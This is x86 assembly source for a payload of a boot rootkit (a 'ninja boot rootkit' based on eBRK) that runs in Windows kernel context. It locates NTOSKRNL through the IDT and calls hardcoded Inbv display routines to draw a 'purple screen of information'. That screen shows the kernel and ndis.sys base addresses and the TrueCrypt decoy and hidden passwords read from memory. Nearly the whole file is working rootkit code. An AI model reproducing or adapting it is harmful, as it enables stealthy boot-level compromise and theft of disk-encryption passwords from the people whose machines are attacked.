; purple screen of information
;
; for the ninja boot rootkit
; (all based on the ebrk =8)

BITS 32

times 43 db 'A'
db "eBR", 0EEh

;----------------
	
	cld
		
	;--- locate NTOSKRNL.EXE image base using non-optimized IDT#00h trick

	push		eax
	sidt		[esp-2]
	pop		esi

	mov		ebx, [esi+4]				; high WORD of EBX = high WORD of interrupt gate offset
	mov		bx, [esi]				; low WORD of EBX = low WORD of offset

	mov		ecx, 00000FFFh				; ECX = 0FFFh (4KB-1)

	or		ebx, ecx
	inc		ebx					; round up to start of next 4KB page

	inc		ecx					; ECX = 1000h (4KB)

@mzloop:

	sub		ebx, ecx				; go back one 4KB page
	cmp		word [ebx], 5A4Dh			; IMAGE_DOS_HEADER.e_magic == IMAGE_DOS_SIGNATURE ("MZ")
	jne		@mzloop

	mov		edx, [ebx+3Ch]				; IMAGE_DOS_HEADER.e_lfanew
	cmp		edx, ecx				; arbitrary upper-bound on RVA of PE header
	jae		@mzloop
	cmp		edx, 40h				; lower-bound of RVA of PE header is sizeof(IMAGE_DOS_HEADER)
	jb		@mzloop

	cmp		dword  [ebx+edx], 00004550h		; IMAGE_NT_HEADERS.Signature == IMAGE_NT_SIGNATURE ("PE\0\0")
	jne		@mzloop

	;--- search for "InbvSolidColorFill" name in export directory

	mov		edi, [ebx+edx+78h]			; EBP = RVA of export directory (making some assumptions)
	add		edi, ebx				; now EBP points to export directory 

	xor		edx, edx
	mov		esi, [edi+20h]				; IMAGE_EXPORT_DIRECTORY.AddressOfNames (RVA)
	add		esi, ebx				; now ESI points to start of name RVA list

	; EBX = image base address of NTOSKRNL.EXE
	; EDX = index
	; ESI = pointer into export name list
	; EDI = pointer to NTOSKRNL export directory
	
	mov		ebp, esp	
	push	ebx			; save NTOSKRNL BASE on stack [ebp-4]
	call	my_rel		; save eip (my_rel) on stack  [ebp-8]
my_rel:
	
; init screen ----
	mov		eax, 00565DBh   ; acquire display
	add		eax, [ebp-4]
	call	eax
	
	mov		eax, 005640dh   ; reset display
	add		eax, [ebp-4]
	call	eax
	
; bakgrnd ----
;	mov		eax, 0056491h  ; solid color fill
;	add		eax, [ebp-4]
;	push    5
;	push    1DFh      ; stop y (479)
;	mov     ebx, 27Fh ; stop x (639
;	push    ebx
;	push    0			; start	y
;	push    0			; start x
;	call    eax
	
	mov		eax, 0056491h  ; solid color fill dgray
	add		eax, [ebp-4]
	push    07h
	push    15       
	mov     ebx, 27Fh ; 639
	push    ebx
	push    0
	push    0
	call    eax
	
	mov		eax, 0056491h  ; solid color fill purple
	add		eax, [ebp-4]
	push    05h
	push    13
	mov     ebx, 292
	push    ebx
	push    1
	push    5
	call    eax
	
	

	mov		eax, 0056491h  ; solid color fill purple
	add		eax, [ebp-4]
	push    05h
	push    14*4+4
	mov     ebx, 27Fh ; 639
	push    ebx
	push    15+1
	push    0
	call    eax

	mov		eax, 0056491h  ; solid color fill light purple
	add		eax, [ebp-4]
	push    0dh
	push    14*8+5
	mov     ebx, 27Fh ; 639
	push    ebx
	push    14*4+5
	push    0
	call    eax
	
	mov		eax, 0056491h  ; solid color fill purple
	add		eax, [ebp-4]
	push    05h
	push    1dfh
	mov     ebx, 27Fh ; 639
	push    ebx
	push    14*8+6
	push    0
	call    eax
	
; prepare printing ----
	mov		eax, 005651Fh  ; set text color
	add		eax, [ebp-4]
	push    0fh
	call    eax

	mov		eax, 003D69Eh  ; InbvInstallDisplayStringFilter
	add		eax, [ebp-4]
	push 	0
	call	eax	
	
	mov		eax, 0038BA9h  ; InbvEnableDisplayString
	add		eax, [ebp-4]
	push 	1
	call	eax	

; print info ---------
	mov		ecx, str_start
	call	print_str_ecx
	
	mov		edx, [ebp-4]
	call	print_hex_edx
	
	mov		ecx, str_ndis
	call	print_str_ecx
	
	mov		edx, [ebp]		; our retn address into ndis.sys
	and		edx, 0fffff000h ; mask out 060 to baseline it
	push	edx ; remember me ; ndis.sys.base
	call	print_hex_edx
	
	mov		ecx, str_decoy
	call	print_str_ecx
	
	; print decoy password
	pop		ecx
	push	ecx
	add		ecx, 000009a48h
	call	print_str_ecx_norel

	mov		ecx, str_hidden
	call	print_str_ecx
	
	; print hidden password
	pop		ecx
	add		ecx, 000009a48h + 16
	call	print_str_ecx_norel

	
endme:	
	add		esp, 8
	retn

; --------------------------------------------------------------

print_str_ecx:			
	add		ecx, [ebp-8]
	sub		ecx, my_rel
print_str_ecx_norel:
	push	ecx
	mov		eax, 00038DE8h  ; InbvDisplayString
	add		eax, [ebp-4]
	call	eax
	retn
	
print_hex_edx:
	mov		ecx, myintstr
	add		ecx, [ebp-8]
	sub		ecx, my_rel
	push	ecx 	; PCHAR String
	push	8		; Length
	push	16		; Base
	push	edx		; Value
	
	; A8F31 ; NTSTATUS __stdcall RtlIntegerToChar(ULONG Value, ULONG Base, ULONG Length, PCHAR String)
	mov		eax, 000A8F31h  ; RtlIntegerToChar
	add		eax, [ebp-4]
	call	eax
	
	mov		ecx, myintstr
	call	print_str_ecx
	retn
																								;
str_start	db " .: PURPLE SCREEN OF iNFORMATION :.                                 <armak00ni>", 0dh, 0ah, 0dh, 0ah
			db "NTOSKRNL BASE: ", 0
str_ndis    db 0dh, 0ah, "NDIS.SYS BASE: ", 0
str_decoy   db 0dh, 0ah, 0dh, 0ah, " ^ Your truecrypt decoy  password is: ", 0
str_hidden  db 0dh, 0ah, 0dh, 0ah, " ^ Your truecrypt HIDDEN password is: ", 0
str_newline db 0dh, 0ah, 0

myintstr db "00000000", 0


;.text:004565DB                 public InbvAcquireDisplayOwnership
;.text:0045640D                 public InbvResetDisplay
;.text:00456491                 public InbvSolidColorFill
;.text:0045651F                 public InbvSetTextColor
;.text:0043D69E                 public InbvInstallDisplayStringFilter
;.text:00438BA9                 public InbvEnableDisplayString
;.text:0045663B                 public InbvSetScrollRegion
;.text:00438DE8                 public InbvDisplayString
; ==============================================================================
;.text:0045C429                 call    InbvAcquireDisplayOwnership
;.text:0045C42E                 call    InbvResetDisplay
;.text:0045C433                 push    4
;.text:0045C435                 push    1DFh
;.text:0045C43A                 mov     ebx, 27Fh
;.text:0045C43F                 push    ebx
;.text:0045C440                 push    esi
;.text:0045C441                 push    esi
;.text:0045C442                 call    InbvSolidColorFill
;.text:0045C447                 push    0Fh
;.text:0045C449                 call    InbvSetTextColor
;.text:0045C44E                 push    esi
;.text:0045C44F                 call    InbvInstallDisplayStringFilter
;.text:0045C454                 push    1
;.text:0045C456                 call    InbvEnableDisplayString
;.text:0045C45B                 push    1DBh
;.text:0045C460                 push    ebx
;.text:0045C461                 push    esi
;.text:0045C462                 push    esi
;.text:0045C463                 call    InbvSetScrollRegion
;.text:0045C468
;.text:0045C468 loc_45C468:                             ; CODE XREF: sub_45BE4A+5DDj
;.text:0045C468                 cmp     [ebp+var_39F], 0
;.text:0045C46F                 jnz     loc_45C5A1
;.text:0045C475                 push    offset asc_45C912 ; "\n"
;.text:0045C47A                 call    InbvDisplayString



